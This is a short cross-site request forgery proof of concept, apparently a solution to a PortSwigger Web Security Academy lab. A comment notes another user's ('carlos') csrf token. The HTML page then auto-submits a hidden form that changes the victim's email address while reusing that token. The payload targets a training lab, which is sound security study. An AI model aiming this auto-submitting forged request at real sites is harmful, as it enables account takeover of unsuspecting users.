/*
document.getElementsByName('csrf')[0].value
"b1oww18moFxLEWt3i3j5HSJTbnlJNPlf"                   for carlos' csrf token

*/

<html>
<body>
    <form action="https://0a5a004804ff483a837bac3600cf00ad.web-security-academy.net/my-account/change-email" method="POST">
        <input required="" type="email" name="email" value="hackertube@tube.net">
        <input required type="hidden" name="csrf" value="b1oww18moFxLEWt3i3j5HSJTbnlJNPlf">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>